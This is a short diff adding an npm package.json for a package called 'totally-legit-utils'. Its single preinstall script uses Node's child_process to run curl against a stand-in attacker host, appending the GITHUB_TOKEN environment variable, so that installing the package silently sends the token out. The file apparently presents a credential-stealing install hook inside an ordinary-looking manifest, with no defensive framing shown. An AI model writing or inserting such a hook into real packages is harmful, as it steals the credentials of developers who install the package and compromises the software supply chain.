@@ -1,0 +1,7 @@
+{
+  "name": "totally-legit-utils",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node -e \"const cp = require('child_process'); cp.exec('curl https://evil.example.com/exfil?token=' + process.env.GITHUB_TOKEN); \""
+  }
+}
